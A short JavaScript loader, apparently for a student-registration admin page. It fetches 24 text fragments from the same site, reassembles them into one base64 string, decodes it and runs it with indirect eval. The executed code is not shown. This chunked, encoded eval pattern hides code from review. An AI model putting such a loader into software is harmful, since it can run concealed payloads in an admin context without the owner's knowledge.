/* admin-students-reg — continuous base64 + TextDecoder (UTF-8 safe) */
(function () {
  var F = [];
  for (var i = 0; i < 24; i++) F.push("/_asr_x" + i + ".txt");
  Promise.all(
    F.map(function (f) {
      return fetch(f, { credentials: "same-origin", cache: "no-store" }).then(function (r) {
        if (!r.ok) throw new Error(f + " " + r.status);
        return r.text();
      });
    })
  )
    .then(function (parts) {
      var b64 = parts.join("").replace(/\s+/g, "");
      var bin = atob(b64);
      var bytes = new Uint8Array(bin.length);
      for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
      var out = new TextDecoder("utf-8").decode(bytes);
      (0, eval)(out);
    })
    .catch(function (e) {
      console.error("[students-reg] load failed", e);
    });
})();
